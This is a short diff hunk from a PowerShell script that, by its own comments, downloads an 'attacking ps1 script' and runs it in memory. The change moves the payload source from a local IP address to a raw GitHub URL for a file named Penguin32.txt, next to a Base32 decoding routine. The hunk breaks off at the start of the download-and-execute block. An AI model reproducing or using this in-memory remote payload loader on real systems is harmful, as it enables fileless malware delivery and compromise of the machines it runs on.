@@ -34,7 +34,7 @@ function Decode-Base32 {
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
 # Specify URL from which attacking ps1 script is downloaded
-$fileUrl = "http://192.168.0.20/Penguin32.txt"
+$fileUrl = "https://raw.githubusercontent.com/yasuhiro0224/Tools/refs/heads/main/Penguin32.txt"
 
 # DL the file and execute it on memory
 try {
